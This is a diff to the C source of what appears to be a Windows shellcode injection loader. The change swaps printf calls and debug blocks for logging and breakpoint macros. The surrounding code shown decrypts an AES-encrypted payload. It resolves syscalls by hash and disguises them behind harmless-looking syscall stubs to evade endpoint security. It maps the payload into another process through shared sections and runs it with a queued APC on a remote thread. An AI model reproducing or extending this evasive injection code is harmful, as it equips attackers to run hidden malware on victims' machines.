@@ -48,7 +48,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -57,7 +57,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -66,7 +66,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -89,7 +89,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -98,7 +98,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -107,7 +107,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -124,7 +124,7 @@ BOOL InstallAesDecryption(PAES pAes)
 
 	if (!NT_SUCCESS(STATUS))
 	{
-		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
+		DEBUG_PRINT("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -229,124 +229,100 @@ BOOL InitializeNtSyscalls()
 	// resolve benign syscalls
 	if (!ResolveNtSyscall(NtCreateFile_CRC32, &g_Benign_Syscall_tab.NtCreateFile))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_Benign_Syscall_tab.NtCreateFile.dwSSn, g_Benign_Syscall_tab.NtCreateFile.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtOpenFile_CRC32, &g_Benign_Syscall_tab.NtOpenFile))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtOpenFile \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtOpenFile \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_Benign_Syscall_tab.NtOpenFile.dwSSn, g_Benign_Syscall_tab.NtOpenFile.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtWriteFile_CRC32, &g_Benign_Syscall_tab.NtWriteFile))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtWriteFile \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtWriteFile \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtWriteFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtWriteFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_Benign_Syscall_tab.NtWriteFile.dwSSn, g_Benign_Syscall_tab.NtWriteFile.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtLockFile_CRC32, &g_Benign_Syscall_tab.NtLockFile))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtLockFile \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtLockFile \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtLockFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtLockFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_Benign_Syscall_tab.NtLockFile.dwSSn, g_Benign_Syscall_tab.NtLockFile.pSyscallAddress);
-#endif
 
 	// resolve syscalls
 	if (!ResolveNtSyscall(NtOpenProcess_CRC32, &g_SyscallTab.NtOpenProcess))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtOpenProcess \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtOpenProcess \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtOpenProcess.dwSSn, g_SyscallTab.NtOpenProcess.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtQueryInformationProcess_CRC32, &g_SyscallTab.NtQueryInformationProcess))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtQueryInformationProcess \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtQueryInformationProcess \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtQueryInformationProcess.dwSSn, g_SyscallTab.NtQueryInformationProcess.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtCreateSection_CRC32, &g_SyscallTab.NtCreateSection))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtCreateSection.dwSSn, g_SyscallTab.NtCreateSection.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtMapViewOfSection_CRC32, &g_SyscallTab.NtMapViewOfSection))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtMapViewOfSection.dwSSn, g_SyscallTab.NtMapViewOfSection.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtUnmapViewOfSection_CRC32, &g_SyscallTab.NtUnmapViewOfSection))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtUnmapViewOfSection.dwSSn, g_SyscallTab.NtUnmapViewOfSection.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtCreateThreadEx_CRC32, &g_SyscallTab.NtCreateThreadEx))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtCreateThreadEx.dwSSn, g_SyscallTab.NtCreateThreadEx.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtQueueApcThread_CRC32, &g_SyscallTab.NtQueueApcThread))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThread \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThread \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtQueueApcThread.dwSSn, g_SyscallTab.NtQueueApcThread.pSyscallAddress);
-#endif
 
 	if (!ResolveNtSyscall(NtAlertResumeThread_CRC32, &g_SyscallTab.NtAlertResumeThread))
 	{
-		printf("[!] Failed In Obtaining The Syscall Number Of NtAlertResumeThread \n");
+		DEBUG_PRINT("[!] Failed In Obtaining The Syscall Number Of NtAlertResumeThread \n");
 		return FALSE;
 	}
-#ifdef _DBG
-	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
+	DEBUG_PRINT("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
 		g_SyscallTab.NtAlertResumeThread.dwSSn, g_SyscallTab.NtAlertResumeThread.pSyscallAddress);
-#endif
 
 	return TRUE;
 }
@@ -382,7 +358,7 @@ int main(int argc, char* argv[])
 	// initializing the used syscalls
 	if (!InitializeNtSyscalls())
 	{
-		printf("[!] Failed To Initialize The Specified Direct-Syscalls \n");
+		DEBUG_PRINT("[!] Failed To Initialize The Specified Direct-Syscalls \n");
 		return -1;
 	}
 
@@ -391,55 +367,47 @@ int main(int argc, char* argv[])
 	if ((status = ExecSyscall(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtOpenProcess Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtOpenProcess Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
-#ifdef _DBG
-	printf("[*]Target process: 0x%p\n", hProcess);
-#endif
+	DEBUG_PRINT("[*]Target process: 0x%p\n", hProcess);
 
 	SET_SYSCALL(g_SyscallTab.NtQueryInformationProcess, g_SyscallTab.NtQueryInformationProcess);
 	if ((status = ExecSyscall(hProcess, ProcessWow64Information, &isWoW64, sizeof(DWORD64), &retLen)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
-	printf("[*]Process architecture is: %s\n", isWoW64 == 1 ? "32bit" : "64bit");
+	DEBUG_PRINT("[*]Process architecture is: %s\n", isWoW64 == 1 ? "32bit" : "64bit");
 
-#ifdef _DBG
-	printf("[i]Press Enter to call NtCreateSection ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[i]Press Enter to call NtCreateSection ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtCreateSection, g_Benign_Syscall_tab.NtWriteFile);
 	if ((status = ExecSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtCreateSection Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
+	DEBUG_PRINT("[*]Local section created at: 0x%p\n", hSection);
 
-#ifdef _DBG
-	printf("[*]Local section created at: 0x%p\n", hSection);
-	printf("[i]Press Enter to call NtMapViewOfSection ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[i]Press Enter to call NtMapViewOfSection ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_Benign_Syscall_tab.NtOpenFile);
 	if ((status = ExecSyscall(hSection, (HANDLE)-1, &lpLocalMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_READWRITE)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
-#ifdef _DBG
-	printf("[*]Local view mapped at: 0x%p\n", lpLocalMap);
-	printf("[i]Press Enter to decrypt payload and call memcpy ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[*]Local view mapped at: 0x%p\n", lpLocalMap);
+	DEBUG_PRINT("[i]Press Enter to decrypt payload and call memcpy ...\n");
+	_INT;
 
 	PVOID pPlaintext = NULL;
 	DWORD dwPlainSize = NULL;
@@ -450,79 +418,67 @@ int main(int argc, char* argv[])
 
 	memcpy(lpLocalMap, pPlaintext, dwPlainSize);
 
-#ifdef _DBG
-	printf("[i]Press Enter to call NtMapViewOfSection ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[i]Press Enter to call NtMapViewOfSection ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_Benign_Syscall_tab.NtLockFile);
 	if ((status = ExecSyscall(hSection, hProcess, &lpRemoteMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_EXECUTE_READ)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
-#ifdef _DBG
-	printf("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
-	printf("[i]Press Enter to call NtUnmapViewOfSection ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
+	DEBUG_PRINT("[i]Press Enter to call NtUnmapViewOfSection ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_Benign_Syscall_tab.NtCreateFile);
 	if ((status = ExecSyscall((HANDLE)-1, lpLocalMap)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
-#ifdef _DBG
-	printf("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
-	printf("[i]Press Enter to load ntdll.dll ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
+	DEBUG_PRINT("[i]Press Enter to load ntdll.dll ...\n");
+	_INT;
 
 	PVOID RtlExitUserThread = (PVOID)GetProcAddressH(GetModuleHandleH(ntdll_CRC32), RtlExitUserThread_CRC32);
 
-#ifdef _DBG
-	printf("[i]Press Enter to call NtCreateThreadEx ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[i]Press Enter to call NtCreateThreadEx ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtCreateThreadEx, g_Benign_Syscall_tab.NtOpenFile);
 	if ((status = ExecSyscall(&hRemoteThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)RtlExitUserThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
-#ifdef _DBG
-	printf("[*]Remote thread create at: 0x%p\n", hRemoteThread);
-	printf("[i]Press Enter to call NtQueueApcThread ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[*]Remote thread create at: 0x%p\n", hRemoteThread);
+	DEBUG_PRINT("[i]Press Enter to call NtQueueApcThread ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtQueueApcThread, g_Benign_Syscall_tab.NtWriteFile);
 	if ((status = ExecSyscall(hRemoteThread, (PIO_APC_ROUTINE)lpRemoteMap, NULL, NULL, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
-#ifdef _DBG
-	printf("[*]Remote thread create at: 0x%p\n", hRemoteThread);
-	printf("[i]Press Enter to call NtAlertResumeThread ...\n");
-	getchar();
-#endif
+	DEBUG_PRINT("[*]Remote thread create at: 0x%p\n", hRemoteThread);
+	DEBUG_PRINT("[i]Press Enter to call NtAlertResumeThread ...\n");
+	_INT;
 
 	SET_SYSCALL(g_SyscallTab.NtAlertResumeThread, g_Benign_Syscall_tab.NtCreateFile);
 	if ((status = ExecSyscall(hRemoteThread, NULL)))
 	{
 		SET_LAST_NT_ERROR(status);
-		printf("[!] NtAlertResumeThread Failed With Error: 0x%0.8X \n", GetLastError());
+		DEBUG_PRINT("[!] NtAlertResumeThread Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
 
